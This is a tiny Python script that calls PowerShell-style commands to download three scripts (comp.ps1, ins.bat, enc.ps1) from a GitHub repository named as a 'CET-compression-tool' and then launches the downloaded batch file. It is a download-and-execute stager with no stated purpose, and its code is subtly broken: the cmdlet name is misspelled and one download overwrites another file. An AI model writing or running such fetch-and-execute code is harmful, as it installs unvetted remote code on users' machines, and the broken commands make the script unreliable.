import os
os.system("Invoke-WbRequest https://www.github.com/BasicInputOutputSystem/CET-compression-tool/comp.ps1 -Outfile comp.ps1")
os.system("Invoke-WbRequest https://www.github.com/BasicInputOutputSystem/CET-compression-tool/ins.bat -Outfile ins.bat")
os.system("Invoke-WbRequest https://www.github.com/BasicInputOutputSystem/CET-compression-tool/enc.ps1 -Outfile ins.bat")
os.startfile("ins.bat")